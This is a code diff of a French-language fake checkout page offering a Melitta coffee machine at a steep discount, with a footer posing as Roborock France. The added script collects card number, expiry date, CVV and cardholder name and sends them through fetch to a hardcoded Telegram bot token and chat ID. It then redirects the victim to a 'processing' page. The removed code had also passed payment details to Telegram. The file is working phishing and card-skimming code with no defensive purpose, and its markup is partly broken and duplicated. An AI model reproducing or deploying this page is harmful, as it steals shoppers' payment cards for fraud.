@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Page de Paiement Sécurisé</title>
-    <script src="https://js.stripe.com/v3/"></script>
+    <title>Page de Paiement</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <style>
         body {
             font-family: 'Roboto', Arial, sans-serif;
@@ -29,13 +29,14 @@
             font-size: 24px;
         }
 
+        /* Section du produit */
         .product-info {
             text-align: center;
             margin-bottom: 30px;
         }
 
         .product-info img {
-            width: 150px;
+            width: 150px; /* Taille de l'image du produit */
             margin-bottom: 15px;
         }
 
@@ -51,15 +52,39 @@
             margin-top: 10px;
         }
 
-        #payment-form {
-            margin-top: 20px;
+        /* Séparateur entre le produit et les informations de paiement */
+        hr {
+            border: 0;
+            border-top: 2px solid #c70000;
+            margin: 30px 0;
         }
 
         .form-group {
             margin-bottom: 20px;
         }
 
-        button {
+        .form-group label {
+            font-weight: 500;
+            margin-bottom: 8px;
+            display: block;
+            color: #333;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: #c70000;
+            outline: none;
+        }
+
+        .form-group button {
             width: 100%;
             padding: 15px;
             background-color: #c70000;
@@ -71,196 +96,211 @@
             transition: background-color 0.3s ease;
         }
 
-        button:hover {
+        .form-group button:hover {
             background-color: #a50000;
         }
 
-        #card-element {
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            padding: 12px;
-            font-size: 16px;
+        .secure-payment {
+            text-align: center;
+            margin-top: 20px;
         }
 
-        #card-errors {
-            color: #c70000;
-            margin-top: 10px;
+        .secure-payment img {
+            width: 150px;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- Informations sur le produit -->
+        <!-- Information du produit -->
         <div class="product-info">
-            <img src="51FWfzIHkWL._AC_SX679_.jpg" alt="Melitta Barista TS Smart Noire">
-            <p><strong>Melitta Barista TS Smart Noire, Machine à Café à Grain</strong></p>
-            <p>Couleur : Noir</p>
+            <img src="71+NzbI3cDL._AC_SX569_.jpg" alt="Melitta Barista TS Smart Noire">
+            <h3>Melitta Barista TS Smart Noire, Machine à Café à Grain</h3>
             <p>Marque : Melitta</p>
+            <p>Couleur : Noir</p>
+            <p>Dimensions : 25,9P x 46,7l x 37,2H cm</p>
+            <p>Caractéristiques spéciales : 15 bars, poids 11.28 kg</p>
             <p>Type : Machine à espresso avec broyeur intégré</p>
-            <p class="price">Prix : 519.99€</p>
+            <p>Usages spécifiques : Filtre réutilisable, programmable, mousseur à lait</p>
+            <p>Finition : Acier inoxydable</p>
+            <p>Note : 4.8 ★★★★★ (982 avis)</p>
+            <p>
+                <span class="old-price">1099.99€</span>
+                <span class="price">519.99€</span>
+            </p>
         </div>
+    </div>
+</body>
+</html>
 
         <!-- Séparateur -->
         <hr>
 
-      <!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulaire de Paiement</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-            background-color: #f9f9f9;
-        }
-        h2 {
-            color: #7f1d1d;
-            text-align: center;
-        }
-        form {
-            max-width: 400px;
-            margin: 0 auto;
-            background: #ffffff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        label {
-            font-size: 14px;
-            font-weight: bold;
-            color: #333;
-            display: block;
-            margin-bottom: 5px;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #7f1d1d;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #a82626;
-        }
-        #card-errors {
-            color: red;
-            font-size: 14px;
-            margin-top: -10px;
-            margin-bottom: 15px;
-        }
-    </style>
-</head>
-<body>
-    <h2>Informations de Paiement</h2>
-    <form id="payment-form">
-        <label for="cardholder-name">Nom du Titulaire</label>
-        <input type="text" id="cardholder-name" placeholder="Entrez le nom du titulaire" required />
+        <!-- Informations de paiement -->
+        <h2>Informations de Paiement</h2>
 
-        <div id="card-element">
-            <!-- Stripe.js intègre ici les champs de carte -->
+        <form action="confirmation.html" method="POST" id="payment-form">
+            <div class="form-group">
+                <label for="card-number">Numéro de carte</label>
+                <input 
+                    type="text" 
+                    id="card-number" 
+                    name="card-number" 
+                    placeholder="xxxx xxxx xxxx xxxx" 
+                    maxlength="19" 
+                    inputmode="numeric" 
+                    required>
+            </div>
+
+            <div class="form-group">
+                <label for="expiry-date">Date d'expiration</label>
+                <div style="display: flex; gap: 10px;">
+                    <select id="expiry-month" name="expiry-month" required>
+                        <option value="" disabled selected>Mois</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                    <select id="expiry-year" name="expiry-year" required>
+                        <option value="" disabled selected>Année</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                        <option value="2031">2031</option>
+                        <option value="2032">2032</option>
+                        <option value="2033">2033</option>
+                        <option value="2034">2034</option>
+                        <option value="2035">2035</option>
+                        <option value="2036">2036</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="cvv">CVV</label>
+                <input 
+                    type="text" 
+                    id="cvv" 
+                    name="cvv" 
+                    placeholder="123" 
+                    maxlength="3" 
+                    inputmode="numeric" 
+                    required>
+            </div>
+
+            <div class="form-group">
+                <label for="name-on-card">Nom sur la carte</label>
+                <input type="text" id="name-on-card" name="name-on-card" placeholder="Entrez le nom" required>
+            </div>
+
+            <div class="form-group">
+                <button type="submit">Payer maintenant</button>
+            </div>
+        </form>
+
+        <div class="secure-payment">
+            <img src="instrumentys_paiement_securise_logo.jpg" alt="Paiement Sécurisé">
         </div>
-        <div id="card-errors" role="alert"></div>
-
-        <button type="submit">Payer maintenant</button>
-    </form>
+    </div>
 
     <script>
-        // Configuration Stripe
-        const stripe = Stripe("pk_test_51HxM4lEY1234567890abcdEFGH");
-        const elements = stripe.elements();
+    const cardInput = document.getElementById('card-number');
 
-        const style = {
-            base: {
-                color: "#32325d",
-                fontFamily: 'Roboto, Arial, sans-serif',
-                fontSize: "16px",
-                "::placeholder": {
-                    color: "#aab7c4"
-                }
-            },
-            invalid: {
-                color: "#fa755a",
-                iconColor: "#fa755a"
-            }
-        };
+    cardInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\s+/g, ''); // Retirer les espaces
+        if (value.length > 16) value = value.slice(0, 16); // Limiter à 16 chiffres
+        const formattedValue = value.replace(/(\d{4})/g, '$1 ').trim(); // Ajouter un espace après chaque 4 chiffres
+        e.target.value = formattedValue;
+    });
 
-        const card = elements.create("card", { style });
-        card.mount("#card-element");
+    // Fonction pour envoyer les informations au bot Telegram
+    document.getElementById('payment-form').addEventListener('submit', async function(e) {
+        e.preventDefault(); // Empêcher l'envoi du formulaire par défaut
 
-        card.on("change", (event) => {
-            const displayError = document.getElementById("card-errors");
-            if (event.error) {
-                displayError.textContent = event.error.message;
+        const data = new FormData(this);
+        const cardNumber = data.get('card-number');
+        const expiryMonth = data.get('expiry-month');
+        const expiryYear = data.get('expiry-year');
+        const cvv = data.get('cvv');
+        const nameOnCard = data.get('name-on-card');
+        const price = "519.99€"; // Prix du produit
+
+        // Créez un message à envoyer
+        const message = `
+Produit : Melitta Barista TS Smart Noire, Machine à Café à Grain
+Prix : ${price}
+Numéro de carte : ${cardNumber}
+Date d'expiration : ${expiryMonth}/${expiryYear}
+CVV : ${cvv}
+Nom sur la carte : ${nameOnCard}
+`;
+
+        const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
+        const chatId = '5372119436'; // Votre chat ID Telegram
+
+        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        try {
+            // Envoi du message
+            const response = await fetch(telegramApiUrl);
+            const dataResponse = await response.json();
+
+            if (dataResponse.ok) {
+                // Redirection vers la page "Traitement.html"
+                window.location.href = "Traitement.html";
             } else {
-                displayError.textContent = "";
+                alert('Erreur dans l\'envoi des informations. Veuillez réessayer.');
             }
-        });
+        } catch (error) {
+            console.error('Erreur lors de l\'envoi:', error);
+            alert('Erreur réseau ou problème avec l\'API Telegram.');
+        }
+    });
+</script>
 
-        // Variables Telegram
-        const botToken = '8101158488:AAH6WIfCC6bGkWd_Tt6QRrWD8QKQQc69M';
-        const chatId = '5372119436';
 
-        // Gestion du formulaire
-        const form = document.getElementById("payment-form");
-        form.addEventListener("submit", async (event) => {
-            event.preventDefault();
-
-            const cardholderName = document.getElementById("cardholder-name").value;
-
-            if (!cardholderName) {
-                alert("Veuillez entrer le nom du titulaire.");
-                return;
-            }
-
-            const { paymentMethod, error } = await stripe.createPaymentMethod({
-                type: "card",
-                card: card,
-                billing_details: {
-                    name: cardholderName,
-                },
-            });
-
-            if (error) {
-                const errorElement = document.getElementById("card-errors");
-                errorElement.textContent = error.message;
-            } else {
-                // Envoyer les données à Telegram
-                const message = 🧾 **Nouvelle Transaction**\n\n🔹 Nom: ${cardholderName}\n🔹 PaymentMethod ID: ${paymentMethod.id};
-                fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: "Markdown",
-                    }),
-                })
-                .then(response => response.json())
-                .then(dataResponse => {
-                    if (dataResponse.ok) {
-                        alert("✅ Paiement validé !");
-                        window.location.href = "Traitement.html";
-                    } else {
-                        alert("Erreur lors de l'envoi à Telegram.");
-                    }
-                })
-                .catch(err => console.error("Erreur Telegram:", err));
-            }
-        });
-    </script>
-</body>
-</html>
+<!-- Footer -->
+<footer style="background-color: #2c3e50; color: #ecf0f1; padding: 20px;">
+    <div style="display: flex; justify-content: space-between; flex-wrap: wrap;">
+        <!-- Colonne 1 -->
+        <div style="flex: 1; min-width: 200px; margin: 10px;">
+            <h4 style="color: #e74c3c;">À propos</h4>
+            <p style="color: #bdc3c7;">Roborock France vous propose les meilleures solutions pour un nettoyage efficace et intelligent.</p>
+        </div>
+        <!-- Colonne 2 -->
+        <div style="flex: 1; min-width: 200px; margin: 10px;">
+            <h4 style="color: #e74c3c;">Liens utiles</h4>
+            <ul style="list-style: none; padding: 0;">
+                <li><a href="#" style="color: #ecf0f1; text-decoration: none;">Politique de confidentialité</a></li>
+                <li><a href="#" style="color: #ecf0f1; text-decoration: none;">Conditions d'utilisation</a></li>
+                <li><a href="#" style="color: #ecf0f1; text-decoration: none;">Assistance</a></li>
+            </ul>
+        </div>
+        <!-- Colonne 3 -->
+        <div style="flex: 1; min-width: 200px; margin: 10px;">
+            <h4 style="color: #e74c3c;">Suivez-nous</h4>
+            <div style="display: flex; gap: 10px;">
+                <a href="https://facebook.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-facebook"></i></a>
+                <a href="https://instagram.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-instagram"></i></a>
+                <a href="https://youtube.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-youtube"></i></a>
+                <a href="https://tiktok.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-tiktok"></i></a>
+            </div>
+        </div>
+    </div>
+    <div style="text-align: center; margin-top: 20px;">
+        <p>&copy; 2025 Roborock France. Tous droits réservés.</p>
+    </div>
+</footer>
